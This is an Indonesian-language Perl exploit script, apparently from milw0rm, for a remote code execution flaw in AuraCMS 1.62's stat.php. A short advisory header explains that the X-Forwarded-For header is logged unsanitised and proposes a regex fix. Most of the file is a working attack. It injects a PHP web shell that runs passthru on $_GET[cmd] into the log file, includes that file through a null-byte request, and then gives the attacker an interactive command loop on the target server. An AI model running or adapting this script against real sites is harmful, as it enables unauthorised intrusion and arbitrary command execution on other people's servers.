#!/usr/bin/perl
#
# Indonesian Newhack Security Advisory
# ------------------------------------
# AuraCMS 1.62 - (stat.php) Remote Code Execution Exploit
# Waktu			:  Jan 16 2008 10:00PM
# Software		:  AuraCMS 1.62  
#			   AuraCMS Mod Block Statistik | http://iwan.or.id/download/lihat/1/2-1-6.html
# Vendor		:  http://www.auracms.org/
# Ditemukan oleh	:  k1tk4t  |  http://newhack.org
# Lokasi		:  Indonesia
# Penjelasan		:
# 
# Kutu pada berkas "stat.php" didalam direktori /mod pada aplikasi web auracms 1.62
# ---//---
# 17. Function User_Online ($minutes, $NamaFile){
# 18. //$ip = $REMOTE_ADDR;
# 19. $ip = getenv("HTTP_X_FORWARDED_FOR");
# 20. if (getenv("HTTP_X_FORWARDED_FOR") == ''){
# 21. $ip = getenv("REMOTE_ADDR");	
# 22. }
# ---//---
# 47. fseek($f,0,SEEK_SET);
# 48. ftruncate($f,0);
# 49. array_pop($user);
# 50. foreach ($user as $line)
# 51.  	{
# 52. 	list($savedip,$savedtime) = split("\|",$line);
# 53. 	if ($savedip == $ip) {$savedtime = $time;$found = 1;}
# 54. 	if ($time < $savedtime + ($minutes * 60)) 
# 55. 		{
# 56. 		fputs($f,"$savedip|$savedtime\n");
# 57. 		$users = $users + 1;
# 58. 		}
# 59. 	}
# 60. 
# 61. if ($found == 0) 
# 62. 	{
# 63. 	fputs($f,"$ip|$time\n");
# 64. 	$users = $users + 1;
# 65. 	}
# 66. 
# 67. fclose ($f);
# ---//---
#
# Sebagai Contoh;
# $ip = getenv("HTTP_X_FORWARDED_FOR");
# $ip = <?php phpinfo() ?>  # <-- user menginjeksi phpinfo
# format yang tersimpan
# <?php phpinfo() ?>|WAKTUBERKUNJUNG
#
# pada AuraCMS versi 1.62, log di simpan pada berkas /mod/online.db.txt [Default]
# 
# pada Mod Block Statistik, log disimpan pada berkas /logs/online.db.txt [Default]
#
# pada AuraCMS versi 2.x mod "online", getenv("HTTP_X_FORWARDED_FOR") bisa berakibat terjadinya "SQL Injection"
#
# => "Perbaikan Kutu stat.php"
# ---//---
# 19. $ip = getenv("HTTP_X_FORWARDED_FOR");
# 20. if (preg_match('/^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$/', getenv("HTTP_X_FORWARDED_FOR")) == ''){
# 21. $ip = getenv("REMOTE_ADDR");
# 22. }
# ---//---
# 
# Exploit ini dibuat untuk pembelajaran, pengetesan dan pembuktian dari apa yang kami pelajari,
# saya[k1tk4t] dan "Indonesian Newhack Technology" tidak bertanggung jawab akan kerusakan 
# yang diakibatkan dari penyalahgunaan exploit oleh pihak lain     
#
# =>
# Terima Kasih untuk;
# -[opt1lc, fl3xu5, ghoz]-
# str0ke, DNX, xoron, y3dips, L41n, cyb3rh3b, K-159, the_hydra, NoGe
# nyubi, iFX, sin~X, k1n9k0ng, bius, selikoer, aldy_BT
# Komunitas Security dan Hacker Indonesia
#
# ----------------------------[Mulai]------------------------------------
use IO::Socket;

if(!$ARGV[2])
{
 print "\n  |-------------------------------------------------------|";
 print "\n  |            Indonesian Newhack Technology              |";
 print "\n  |-------------------------------------------------------|";
 print "\n  | AuraCMS 1.62 (stat.php) Remote Code Execution Exploit |";
 print "\n  |                  Coded by k1tk4t                      |";
 print "\n  |-------------------------------------------------------|";
 print "\n[!] ";
 print "\n[!] Penggunaan : perl auracms22.pl [Site] [Path] [Port]";
 print "\n[!] Contoh     : perl auracms22.pl localhost /aura162/ 80";
 print "\n[!] ";
 print "\n";
 exit;
}

$oriserver = $ARGV[0];
$orihost   = "http://".$oriserver;
$oridir    = $ARGV[1];
$oriport   = $ARGV[2];

print "- Melakukan Koneksi $orihost$oridir\r\n";
  
$injurl = "index.php?pilih=stat&mod=yes";
$injeksi = $oridir.$injurl;
$kodeterlarang = "<?php echo t4mugel4p;error_reporting(0);set_time_limit(0);if (get_magic_quotes_gpc()){\$_GET[cmd]=stripslashes(\$_GET[cmd]);}passthru(\$_GET[cmd]);die;?>";
print "- Sedang menginjeksi kode jahat\r\n";
$injkode =  IO::Socket::INET->new(Proto => "tcp", PeerAddr => "$oriserver", PeerPort => "$oriport") || die "- Koneksi Gagal...\r\n";
print $injkode "GET ".$injeksi." HTTP/1.1\n";
print $injkode "Host: ".$oriserver."\r\n";
print $injkode "X-Forwarded-For: ".$kodeterlarang."\r\n";
print $injkode "\r\n\r\n";
close ($injkode);

while($perintah !~ "mati") 
{
$ekseurl = "index.php?pilih=online.db.txt%00&mod=yes&cmd=".$perintah."";
$eksekusi = $oridir.$ekseurl;
print "- Sedang mencoba menjalankan kode injeksi\r\n";
$eksekode =  IO::Socket::INET->new(Proto => "tcp", PeerAddr => "$oriserver", PeerPort => "$oriport") || die "- Koneksi Gagal...\r\n";
print $eksekode "GET ".$eksekusi." HTTP/1.1\n";
print $eksekode "Host: ".$oriserver."\r\n";
print $eksekode "User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.11) Gecko/20071127 Firefox/2.0.0.11";
print $eksekode "Accept: */*\r\n";
print $eksekode "Connection: close\r\n\n";

while ($hasil = <$eksekode>)
	{ 
	print $hasil; 
	}
print "[+]perintah => ";
$perintah = <STDIN>;  
}

# milw0rm.com [2008-01-18]
